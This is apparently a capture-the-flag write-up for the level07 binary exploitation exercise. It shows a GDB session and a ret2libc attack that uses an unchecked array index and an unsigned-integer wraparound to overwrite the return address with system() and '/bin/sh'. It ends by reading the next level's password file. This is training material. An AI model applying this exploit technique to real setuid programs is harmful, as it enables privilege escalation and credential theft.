```shell
$> ls -la
[...]
-rwsr-s---+ 1 level08 users   11744 Sep 10  2016 level07
[...]

$> ./level07
----------------------------------------------------
  Welcome to wil\'s crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 42
 Index: 42
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command: read
 Index: 42
 Number at data[42] is 0
 Completed read command successfully
Input command: quit
```

Analyze with ghidra and disassembler the code in GDB

```c
// check source.c file
// we have here a main function to stock a number if input is "store"
// to read a number if input is "read"
// number is stored in an array of type int with a size of 100
// the index of the array is not protected
// we gonna use a ret2libc technique to get a shell
```

```shell
# read source.c is better to understand the logic of the code
```

```shell
$> gdb -q level07
(gdb) set disassembly-flavor intel
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
[...]
(gdb) info frame
[...]
  ebp at 0xffffd6b8, eip at 0xffffd6bc

# eip is at 0xffffd6bc
# ((in linux (42): 0xffffd70c)

(gdb) b read_number
[...]

(gdb) c
[...]
read
[...]

(gdb) disas read_number
    [...]
    0x080486ff <+40>:    add    eax,DWORD PTR [ebp+0x8]
    [...]

(gdb) x $ebp+0x8
0xffffd4d0:     0xffffd4f4

# to know the address of the buffer
# 0xffffd4d0: address of the buffer address
# 0xffffd4f4: buffer address
# ((in linux (42): 0xffffd520 & 0xffffd544)
# 0xffffd6bc - 0xffffd4f4 = 0x1c8
# 0x1c8 / 0x4 = 0x72 = 114
# the offset is 114

(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

# address of system in libc: 0xf7e6aed0 = 4159090384

(gdb) find __libc_start_main, +99999999, "/bin/sh"
0xf7f897ec
[...]

# address of /bin/sh in libc: 0xf7f897ec = 4160264172

# we have some difficult here to access 114th index of the array, because 114 % 3 = 0
# so we need use the overflow of unsigned int to access the 114th index of the array
# 2^32 = 4294967296
# 4294967296 / 4 = 1073741824
# 1073741824 + 114 = 1073741938

$> ./level07
[...]
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```